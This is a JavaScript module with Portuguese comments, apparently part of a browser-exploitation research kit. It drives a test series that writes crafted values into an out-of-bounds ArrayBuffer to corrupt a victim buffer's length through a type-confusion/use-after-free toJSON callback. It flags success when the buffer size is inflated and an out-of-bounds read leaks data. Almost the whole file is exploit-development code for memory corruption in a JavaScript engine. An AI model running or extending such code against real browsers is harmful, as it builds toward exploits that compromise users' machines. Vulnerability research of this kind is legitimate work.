// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Importa a função de teste principal e a toJSON de sondagem
import { executeFocusedTestForTypeError, toJSON_AttemptWriteToThis } from './testJsonTypeConfusionUAFSpeculative.mjs'; 
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

async function runIndirectVictimABCorruptionTest() {
    const FNAME_RUNNER = "runIndirectVictimABCorruptionTest";
    logS3(`==== INICIANDO Teste de Corrupção Indireta de victim_ab via oob_array_buffer_real[0x70] ====`, 'test', FNAME_RUNNER);

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    const values_to_write_in_oob_ab = [
        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF },
        { desc: "Val_00000000", val: 0x00000000 },
        { desc: "Val_00000001", val: 0x00000001 },
        { desc: "Val_41414141", val: 0x41414141 }, // 'AAAA'
        { desc: "Val_victim_size_plus_4", val: 64 + 4 }, // 0x44
        { desc: "Val_large_size_like", val: 0x1000 },   // Um tamanho maior
    ];

    for (const oob_val_case of values_to_write_in_oob_ab) {
        const testDescription = `IndirectCorruption_victim_ab_OOBVal_${oob_val_case.desc}_at_0x70`;
        logS3(`\n--- Testando Corrupção Indireta: Escrevendo ${toHex(oob_val_case.val)} em oob_ab[${toHex(corruption_offset_in_oob_ab)}] ---`, 'subtest', FNAME_RUNNER);
        
        let result = await executeFocusedTestForTypeError(
            testDescription,
            toJSON_AttemptWriteToThis, // A toJSON que sonda 'this' (victim_ab)
            oob_val_case.val,
            corruption_offset_in_oob_ab
        );
        
        if (result.errorOccurred) {
            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO (stringify): ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        } else if (result.potentiallyCrashed) {
            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito no stringify.`, "good", FNAME_RUNNER);
            const resData = result.stringifyResult;
            logS3(`      toJSON Result: ${resData ? JSON.stringify(resData) : 'N/A'}`, "leak", FNAME_RUNNER);

            if (resData && resData.toJSON_executed === "toJSON_AttemptWriteToThis_v2") {
                if (resData.error_in_toJSON) {
                    logS3(`      ERRO DENTRO da toJSON: ${resData.error_in_toJSON}`, "warn", FNAME_RUNNER);
                } else {
                    logS3(`      victim_ab.byteLength (como this.byteLength_prop): ${resData.this_byteLength_prop}`, "leak", FNAME_RUNNER);
                    logS3(`      Escrita/Leitura interna em victim_ab[0] ${resData.internal_rw_match ? 'OK' : 'FALHOU'} (leu ${resData.internal_read_val} vs escreveu ${resData.internal_write_val})`, resData.internal_rw_match ? "good" : "error", FNAME_RUNNER);
                    
                    const original_victim_ab_size = 64;
                    if (typeof resData.this_byteLength_prop === 'number' && resData.this_byteLength_prop > original_victim_ab_size) {
                        logS3(`      !!!! TAMANHO DO VICTIM_AB INFLADO !!!! Percebido: ${resData.this_byteLength_prop}, Original: ${original_victim_ab_size}`, "critical", FNAME_RUNNER);
                        document.title = `SUCCESS: victim_ab size INFLATED to ${resData.this_byteLength_prop}!`;
                        logS3(`      Tentativa de Leitura OOB em victim_ab @${resData.oob_read_offset_attempted}: ${resData.oob_read_value_attempted}`, 
                              (String(resData.oob_read_value_attempted).startsWith("0x") ? "critical" : "warn"), FNAME_RUNNER);
                    } else if (typeof resData.this_byteLength_prop === 'number') {
                        logS3(`      Tamanho do victim_ab (${resData.this_byteLength_prop}) não inflado. Tentativa OOB: ${resData.oob_read_value_attempted}`, "info", FNAME_RUNNER);
                    }
                }
            }
        }
        logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        if (document.title.startsWith("CONGELOU?")) {
            logS3("Congelamento detectado, interrompendo série de testes.", "error", FNAME_RUNNER);
            break; 
        }
    }

    logS3(`==== Teste de Corrupção Indireta de victim_ab CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_IndirectVictimCorrupt';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Teste de Corrupção Indireta de victim_ab ====`, 'test', FNAME);
    document.title = "Iniciando Script 3 - Corrupção Indireta victim_ab";
    
    await runIndirectVictimABCorruptionTest();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Teste de Corrupção Indireta de victim_ab) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("SUCCESS") || document.title.includes("INFLATED")) {
        // Manter
    }
    else {
        document.title = "Script 3 Concluído - Corrupção Indireta victim_ab";
    }
}
